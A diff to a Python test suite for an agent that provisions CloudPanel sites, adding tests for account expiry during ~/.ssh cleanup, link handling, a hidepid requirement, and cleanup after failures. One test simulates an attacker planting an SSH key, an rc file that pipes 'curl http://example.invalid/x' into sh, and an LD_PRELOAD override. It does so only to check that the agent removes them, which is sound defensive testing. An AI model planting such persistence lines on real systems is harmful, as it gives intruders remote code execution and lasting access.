@@ -38,7 +38,22 @@ AGENT_DIR = os.path.dirname(HERE)
 SCRIPT = os.path.join(AGENT_DIR, "weblion-clp")
 INSTALLER = os.path.join(AGENT_DIR, "install.sh")
 FAKE_TOOL = os.path.join(HERE, "fakes", "fake_tool.py")
-TOOLS = ("clpctl", "mysql", "chpasswd", "pkill", "crontab", "dpkg-query", "ip", "du", "nice", "ionice", "hang")
+TOOLS = (
+    "clpctl",
+    "mysql",
+    "chpasswd",
+    "usermod",
+    "userdel",
+    "pkill",
+    "crontab",
+    "dpkg-query",
+    "ip",
+    "du",
+    "nice",
+    "ionice",
+    "hang",
+)
+HIDEPID = "proc /proc proc rw,nosuid,nodev,noexec,relatime,hidepid=invisible 0 0\n"
 
 # 2026-10-11 12:00:30 UTC: second 30, outside clp-agent's write slot.
 NOW = datetime.datetime(2026, 10, 11, 12, 0, 30, tzinfo=datetime.timezone.utc).timestamp()
@@ -129,6 +144,7 @@ class Server:
             handle.write("   1: 0100007F:0BBD 0100007F:D2C8 01 00000000:00000000\n")  # 3005 connected
         with open(self.path("os-release"), "w", encoding="utf-8") as handle:
             handle.write('NAME="Debian GNU/Linux"\nPRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\n')
+        self.mounts(HIDEPID)
         self.save_state(
             {
                 "now": NOW,
@@ -177,6 +193,7 @@ class Server:
             "clpctl": self.path("bin", "clpctl"),
             "mysql": self.path("bin", "mysql"),
             "minCloudPanel": "2.5.0",
+            "requireHidepid": True,
         }
         self.write_config()
         paths = self.module.Paths()
@@ -191,11 +208,12 @@ class Server:
         paths.php_bin_dir = self.path("php-bin")
         paths.php_etc_dir = self.path("php-etc")
         paths.proc_net_tcp = (self.path("proc", "tcp"), self.path("proc", "tcp6"))
+        paths.proc_mounts = self.path("proc", "mounts")
         paths.crontabs = self.path("crontabs")
         paths.sudoers = self.path("etc", "sudoers-weblion-agent")
         paths.sshd_dropin = self.path("etc", "sshd-weblion-agent.conf")
         paths.shell = sys.executable
-        for tool in ("chpasswd", "pkill", "crontab", "ip", "du", "nice", "ionice"):
+        for tool in ("chpasswd", "usermod", "userdel", "pkill", "crontab", "ip", "du", "nice", "ionice"):
             setattr(paths, tool, self.path("bin", tool))
         paths.dpkg_query = self.path("bin", "dpkg-query")
         self.paths = paths
@@ -225,6 +243,11 @@ class Server:
         self.config.update(changes)
         with open(self.path("etc", "config.json"), "w", encoding="utf-8") as handle:
             json.dump(self.config, handle)
+
+    def mounts(self, text):
+        """/proc/mounts as the agent reads it (the default has hidepid)."""
+        with open(self.path("proc", "mounts"), "w", encoding="utf-8") as handle:
+            handle.write("sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0\n" + text)
 
     def protect(self, *lines):
         with open(self.path("etc", "protected.conf"), "w", encoding="utf-8") as handle:
@@ -688,7 +711,13 @@ class CreateTest(AgentTestCase):
         )
         self.assertEqual([c["stdin"] for c in server.calls("chpasswd")], ["shop-example-ch:%s\n" % REAL])
         self.assertEqual(server.state()["linuxPasswords"]["shop-example-ch"], REAL)
-        # The window in which the throw-away password could have been used is closed.
+        # The window in which the throw-away password could have been used is closed: the
+        # account is expired while it is cleaned, and opened again afterwards.
+        self.assertEqual(
+            [c["argv"] for c in server.calls("usermod")],
+            [["--expiredate", "1", "shop-example-ch"], ["--expiredate", "", "shop-example-ch"]],
+        )
+        self.assertEqual(server.state().get("expired", {}), {})
         self.assertEqual([c["argv"] for c in server.calls("pkill")], [["-KILL", "-u", "shop-example-ch"]] * 2)
         self.assertEqual([c["argv"] for c in server.calls("crontab")], [["-r", "-u", "shop-example-ch"]])
         self.assertEqual(os.path.getsize(os.path.join(home, ".ssh", "authorized_keys")), 0)
@@ -706,7 +735,7 @@ class CreateTest(AgentTestCase):
         self.assertEqual(stat.S_IMODE(os.stat(server.paths.managed).st_mode), 0o600)
         self.assertEqual(
             [c["program"] for c in server.calls()],
-            ["dpkg-query", "clpctl", "clpctl", "chpasswd", "pkill", "crontab", "pkill"],
+            ["dpkg-query", "clpctl", "clpctl", "chpasswd", "usermod", "pkill", "crontab", "pkill", "usermod"],
         )
         self.assertNoSecretLeft(REAL)
         self.assertIn(throwaway, server.panel("SELECT user_password FROM site")[0][0])
@@ -714,6 +743,123 @@ class CreateTest(AgentTestCase):
         self.assertEqual(len(log), 1)
         self.assertEqual((log[0]["op"], log[0]["domain"], log[0]["code"]), ("create", "shop.example.ch", "ok"))
         self.assertTrue(set(log[0]) >= {"requestId", "ms", "time"})
+
+    def test_nothing_planted_with_the_throwaway_password_survives(self):
+        server = self.server
+        home = server.path("home", "shop-example-ch")
+        outside = server.path("etc", "outside")
+        with open(outside, "w", encoding="utf-8") as handle:
+            handle.write("not the site's\n")
+        clpctl, read_panel, empty_ssh_dir = (
+            self.module.Agent.clpctl,
+            self.module.Agent.read_panel,
+            self.module.Agent.empty_ssh_dir,
+        )
+        reads, expired_while_cleaning = [], []
+
+        def attacker(agent, *args, **kwargs):
+            # Somebody read the throw-away password in ps and logged in while clpctl ran.
+            result = clpctl(agent, *args, **kwargs)
+            if args[0] == "site:add:php":
+                ssh = os.path.join(home, ".ssh")
+                for name, text in (
+                    ("authorized_keys2", "ssh-ed25519 AAAAattacker\n"),
+                    ("rc", "curl http://example.invalid/x | sh\n"),
+                    ("environment", "LD_PRELOAD=/tmp/x.so\n"),
+                ):
+                    with open(os.path.join(ssh, name), "w", encoding="utf-8") as handle:
+                        handle.write(text)
+                os.makedirs(os.path.join(ssh, "deep", "er"))
+                with open(os.path.join(ssh, "deep", "er", "key"), "w", encoding="utf-8") as handle:
+                    handle.write("x\n")
+                os.symlink(outside, os.path.join(ssh, "link"))
+            return result
+
+        def recording_read(agent):
+            reads.append(len(server.calls("chpasswd")))
+            return read_panel(agent)
+
+        def recording_empty(agent, path):
+            expired_while_cleaning.append(dict(server.state().get("expired", {})))
+            return empty_ssh_dir(agent, path)
+
+        with mock.patch.object(self.module.Agent, "clpctl", attacker), mock.patch.object(
+            self.module.Agent, "read_panel", recording_read
+        ), mock.patch.object(self.module.Agent, "empty_ssh_dir", recording_empty):
+            answer = server.create()
+        self.assertTrue(answer["ok"], answer)
+        # authorized_keys2 (read by sshd too), rc (runs at every login) and the rest are gone.
+        self.assertEqual(os.listdir(os.path.join(home, ".ssh")), ["authorized_keys"])
+        self.assertEqual(os.path.getsize(os.path.join(home, ".ssh", "authorized_keys")), 0)
+        with open(outside, encoding="utf-8") as handle:
+            self.assertEqual(handle.read(), "not the site's\n")
+        # The real password replaced the throw-away one before the panel was read (that waits
+        # for clp-agent's quiet window); nobody could log in while ~/.ssh was cleaned.
+        self.assertEqual(reads[:2], [0, 1])
+        self.assertEqual(expired_while_cleaning, [{"shop-example-ch": "1"}])
+        programs = [c["program"] for c in server.calls() if c["program"] in ("usermod", "pkill", "crontab")]
+        self.assertEqual(programs, ["usermod", "pkill", "crontab", "pkill", "usermod"])
+
+    def test_links_in_ssh_are_removed_not_followed(self):
+        server = self.server
+        agent = server.agent()
+        home = server.path("home", "linked")
+        outside = server.path("etc", "outside")
+        for kind in ("hard", "soft"):
+            shutil.rmtree(home, ignore_errors=True)
+            os.makedirs(os.path.join(home, ".ssh"))
+            with open(outside, "w", encoding="utf-8") as handle:
+                handle.write("not the site's\n")
+            link = os.path.join(home, ".ssh", "authorized_keys")
+            (os.link if kind == "hard" else os.symlink)(outside, link)
+            agent.empty_ssh_dir(home)
+            self.assertEqual(os.listdir(os.path.join(home, ".ssh")), [], kind)
+            with open(outside, encoding="utf-8") as handle:
+                self.assertEqual(handle.read(), "not the site's\n", kind)
+        # ~/.ssh replaced by a link: nothing is touched, the creation fails.
+        shutil.rmtree(home)
+        os.makedirs(home)
+        os.symlink(server.path("etc"), os.path.join(home, ".ssh"))
+        with self.assertRaises(self.module.AgentError):
+            agent.empty_ssh_dir(home)
+        self.assertTrue(os.path.exists(outside))
+
+    def test_without_hidepid_nothing_is_created(self):
+        server = self.server
+        server.mounts("proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0\n")
+        error = self.assertError(server.create(), "version")
+        self.assertIn("hidepid", error["message"])
+        self.assertFalse([c for c in server.calls("clpctl") if c["argv"][0].startswith("site:add")])
+        server.add_site("site.example.ch", "site-example-ch")
+        answer = server.request(
+            "db-add",
+            {"domain": "site.example.ch", "name": "site_example_ch_db", "userName": "site_example_ch_db"},
+            {"password": DB_REAL},
+        )
+        self.assertError(answer, "version")
+        self.assertNotIn("db:add", server.clpctl_commands())
+        # A later mount on /proc hides what an earlier one showed, and the other way round.
+        server.mounts("proc /proc proc rw,hidepid=2 0 0\nproc /proc proc rw,relatime 0 0\n")
+        self.assertError(server.create(), "version")
+        server.mounts("proc /proc proc rw,relatime 0 0\nproc /proc proc rw,relatime,hidepid=2 0 0\n")
+        self.assertTrue(server.create()["ok"])
+        server.mounts("proc /proc proc rw,relatime,hidepid=noaccess 0 0\n")
+        self.assertError(server.create(domain="two.example.ch", siteUser="two-example-ch"), "version")
+        # The operator may accept the risk.
+        server.write_config(requireHidepid=False)
+        self.assertTrue(server.create(domain="two.example.ch", siteUser="two-example-ch")["ok"])
+
+    def test_the_server_name_is_never_a_website(self):
+        server = self.server
+        for domain in ("web1.example.test", "www.web1.example.test"):
+            self.assertError(server.create(domain=domain, siteUser="web1-example-test"), "protected", "domain")
+        server.write_config(allowRemoteAdopt=True)
+        server.add_site("web1.example.test", "web1-example-test", managed=False)
+        self.assertError(server.request("adopt", {"domain": "web1.example.test"}), "protected")
+        self.assertEqual(server.managed(), {})
+        # Without a fully qualified name there is nothing to protect.
+        agent = server.agent(hostname=lambda: "localhost")
+        self.assertFalse(agent.domain_protected("localhost.example.ch", agent.load_protected()))
 
     def test_static_site(self):
         answer = self.server.create(type="static", phpVersion=None, template=None)
@@ -795,6 +941,32 @@ class CreateTest(AgentTestCase):
         self.assertEqual(server.calls("chpasswd"), [])
         self.assertEqual(server.managed(), {})
 
+    def test_a_linux_user_without_site_is_removed(self):
+        server = self.server
+        server.mode("site:add:php", "user_only")
+        error = self.assertError(server.create(), "clpctl_failed")
+        self.assertIs(error["rolledBack"], True)
+        self.assertEqual([c["argv"] for c in server.calls("userdel")], [["--remove", "shop-example-ch"]])
+        self.assertNotIn("shop-example-ch", server.state()["passwd"])
+        self.assertFalse(os.path.exists(server.path("home", "shop-example-ch")))
+        self.assertNotIn("site:delete", server.clpctl_commands())
+        self.assertEqual(server.managed(), {})
+        # The same site user can be used again right away.
+        server.mode("site:add:php", "ok")
+        self.assertTrue(server.create()["ok"])
+
+    def test_a_linux_user_that_cannot_be_removed_is_logged(self):
+        server = self.server
+        server.mode("site:add:php", "user_only")
+        server.mode("userdel", "fail")
+        error = self.assertError(server.create(), "clpctl_failed")
+        self.assertIs(error["rolledBack"], False)
+        self.assertIn("shop-example-ch", server.state()["passwd"])
+        # Its throw-away password is gone anyway.
+        self.assertNotEqual(server.state()["linuxPasswords"]["shop-example-ch"], REAL)
+        events = [e for e in server.log_lines() if e.get("event") == "leftover_user"]
+        self.assertEqual([e["user"] for e in events], ["shop-example-ch"])
+
     def test_rollback_when_the_password_cannot_be_set(self):
         server = self.server
         server.mode("chpasswd", "fail")
@@ -816,8 +988,15 @@ class CreateTest(AgentTestCase):
         # The site is still there, managed: the console can delete it later.
         self.assertEqual(len(server.panel("SELECT * FROM site")), 1)
         server.change_state(lambda s: s["modes"].clear())
+        before = len(server.calls("usermod"))
         self.assertTrue(server.request("password", {"domain": "shop.example.ch"}, {"password": REAL})["ok"])
         self.assertIs(server.managed()["shop.example.ch"]["incomplete"], False)
+        # The window of the failed creation is closed now, and the account is open.
+        self.assertEqual(
+            [c["argv"][1] for c in server.calls("usermod")[before:]],
+            ["1", ""],
+        )
+        self.assertEqual(server.state().get("expired", {}), {})
 
     def test_timeout_before_the_site_exists(self):
         server = self.server
@@ -928,6 +1107,48 @@ class CreateTest(AgentTestCase):
         # The throw-away value is only in clpctl's own argv.
         for text in server.answers + [json.dumps(server.log_lines())]:
             self.assertNotIn(throwaway, text)
+
+    def test_passwords_equal_to_names_leave_the_facts_alone(self):
+        server = self.server
+        # Allowed passwords, if lazy ones: the domain, the database name.
+        args = {
+            "domain": "shop.example.ch",
+            "type": "php",
+            "phpVersion": "8.4",
+            "template": "WordPress",
+            "siteUser": "shop-example-ch",
+            "database": {"name": "shop_example_ch_wp", "userName": "shop_example_ch_wp"},
+        }
+        answer = server.request(
+            "create", args, {"password": "shop.example.ch", "databasePassword": "shop_example_ch_wp"}
+        )
+        self.assertTrue(answer["ok"], answer)
+        site = answer["data"]["site"]
+        self.assertEqual(site["domain"], "shop.example.ch")
+        self.assertEqual(site["webRoot"], server.path("home", "shop-example-ch", "htdocs", "shop.example.ch"))
+        self.assertEqual(
+            site["databases"], [{"name": "shop_example_ch_wp", "users": ["shop_example_ch_wp"], "sizeBytes": None}]
+        )
+        answer = server.request(
+            "db-add",
+            {"domain": "shop.example.ch", "name": "shop_example_ch_db2", "userName": "shop_example_ch_db2"},
+            {"password": "shop_example_ch_db2"},
+        )
+        self.assertEqual(
+            [d["name"] for d in answer["data"]["site"]["databases"]], ["shop_example_ch_db2", "shop_example_ch_wp"]
+        )
+        # Texts still lose every secret.
+        server.mode("db:add", "fail")
+        server.change_state(lambda s: s["echo"].__setitem__("db:add", "failed for shop_example_ch_db3"))
+        error = self.assertError(
+            server.request(
+                "db-add",
+                {"domain": "shop.example.ch", "name": "shop_example_ch_db3", "userName": "shop_example_ch_db3"},
+                {"password": "shop_example_ch_db3"},
+            ),
+            "clpctl_failed",
+        )
+        self.assertNotIn("shop_example_ch_db3", error["message"] + error.get("output", ""))
 
     def test_timeout_kills_the_whole_process_group(self):
         server = self.server
@@ -1234,6 +1455,63 @@ class PasswordAndCertificateTest(AgentTestCase):
         server.mode("lets-encrypt:install:certificate", "short")
         error = self.assertError(server.request("cert", {"domain": "site.example.ch"}), "clpctl_failed")
         self.assertIs(server.managed()["site.example.ch"]["letsEncrypt"], False)
+
+
+class AfterChangeTest(AgentTestCase):
+    """A read that fails after the change was made never looks like a refusal (busy, version,
+    not_found tell the console that nothing happened)."""
+
+    def lock_panel_after(self, reads):
+        """CloudPanel's database stays locked from read number `reads` + 1 on."""
+        read_panel = self.module.Agent.read_panel
+        count = []
+
+        def flaky(agent):
+            count.append(1)
+            if len(count) > reads:
+                raise sqlite3.OperationalError("database is locked")
+            return read_panel(agent)
+
+        return mock.patch.object(self.module.Agent, "read_panel", flaky)
+
+    def assertUnknownOutcome(self, answer, text):
+        error = self.assertError(answer, "clpctl_failed")
+        self.assertIs(error["rolledBack"], False)
+        self.assertIn(text, error["message"])
+        self.assertIn("busy", error["message"])
+
+    def test_create(self):
+        server = self.server
+        # create_command and the check after clpctl read; the answer's read fails.
+        with self.lock_panel_after(2):
+            answer = server.create()
+        self.assertUnknownOutcome(answer, "shop.example.ch has been created")
+        self.assertIn("shop.example.ch", server.managed())
+        self.assertEqual(len(server.panel("SELECT * FROM site")), 1)
+
+    def test_changes_of_existing_sites(self):
+        server = self.server
+        server.add_site("site.example.ch", "site-example-ch", databases=["site_example_ch_wp"], cert_days=3)
+        cases = [
+            ("db-add", {"name": "site_example_ch_x", "userName": "site_example_ch_x"}, {"password": DB_REAL}, 2),
+            ("db-delete", {"name": "site_example_ch_x"}, None, 1),
+            ("cert", {}, None, 1),
+            ("delete", {}, None, 1),
+        ]
+        for op, args, secret_values, reads in cases:
+            with self.lock_panel_after(reads):
+                answer = server.request(op, dict(args, domain="site.example.ch"), secret_values)
+            self.assertUnknownOutcome(answer, "")
+        # The changes happened all the same.
+        self.assertEqual(server.panel("SELECT * FROM site"), [])
+        self.assertIn("lets-encrypt:install:certificate", server.clpctl_commands())
+
+    def test_refusals_before_the_change_stay_busy(self):
+        server = self.server
+        server.add_site("site.example.ch", "site-example-ch")
+        with self.lock_panel_after(0):
+            self.assertError(server.request("delete", {"domain": "site.example.ch"}), "busy")
+        self.assertNotIn("site:delete", server.clpctl_commands())
 
 
 # --- reads -------------------------------------------------------------------------------------------
@@ -1567,6 +1845,7 @@ class ConfigTest(AgentTestCase):
             ("allowRemoteAdopt", "yes"),
             ("phpVersions", ["8"]),
             ("agentUser", "a b"),
+            ("requireHidepid", "no"),
         ):
             server.write_config(**{key: value})
             error = self.assertError(server.request("list"), "internal")
@@ -1656,6 +1935,34 @@ class LocalCommandTest(AgentTestCase):
         self.assertEqual(site["databases"][0]["sizeBytes"], 3145728)
         self.assertEqual(stat.S_IMODE(os.stat(server.paths.usage).st_mode), 0o600)
 
+    def test_refresh_usage_goes_on_after_a_slow_site(self):
+        server = self.server
+        server.add_site("slow.example.ch", "slow-example-ch")
+        server.add_site("site.example.ch", "site-example-ch")
+        server.change_state(lambda s: s.update(du={"site-example-ch": 52428800}))
+        os.makedirs(os.path.dirname(server.paths.usage), exist_ok=True)
+        with open(server.paths.usage, "w", encoding="utf-8") as handle:
+            json.dump(
+                {"slow.example.ch": {"diskBytes": 123, "databases": {}, "measuredAt": "2026-10-10T06:00:00Z"}}, handle
+            )
+        disk_usage = self.module.Agent.disk_usage
+
+        def slow(agent, home):
+            if home.endswith("slow-example-ch"):
+                raise self.module.AgentError("timeout", "du did not finish within 300 s")
+            return disk_usage(agent, home)
+
+        with mock.patch.object(self.module.Agent, "disk_usage", slow):
+            code, out, _err = self.run_local("refresh-usage")
+        self.assertEqual(code, 1)
+        self.assertIn("slow.example.ch: du did not finish within 300 s", out)
+        self.assertIn("Measured 2 websites, 1 of them failed", out)
+        with open(server.paths.usage, encoding="utf-8") as handle:
+            usage = json.load(handle)
+        self.assertEqual(usage["site.example.ch"]["diskBytes"], 52428800)
+        # The slow site keeps its last measurement.
+        self.assertEqual(usage["slow.example.ch"]["diskBytes"], 123)
+
     def test_selftest(self):
         server = self.server
         server.add_site("legacy.example.ch", "legacy", managed=False)
@@ -1672,6 +1979,15 @@ class LocalCommandTest(AgentTestCase):
         self.assertIn("OK    CloudPanel database: 1 sites", out)
         self.assertIn("OK    MySQL master credentials", out)
         self.assertNotIn(MASTER, out)
+        self.assertIn("OK    hidepid", out)
+        server.mounts("proc /proc proc rw,relatime 0 0\n")
+        code, out, _err = self.run_local("selftest")
+        self.assertEqual(code, 1)
+        self.assertIn("FAIL  hidepid", out)
+        server.write_config(requireHidepid=False)
+        code, out, _err = self.run_local("selftest")
+        self.assertEqual(code, 0, out)
+        self.assertIn("WARN  every user of this server can read the temporary passwords", out)
         server.change_state(lambda s: s.__setitem__("dpkgVersion", "2.4.9"))
         code, out, _err = self.run_local("selftest")
         self.assertEqual(code, 1)
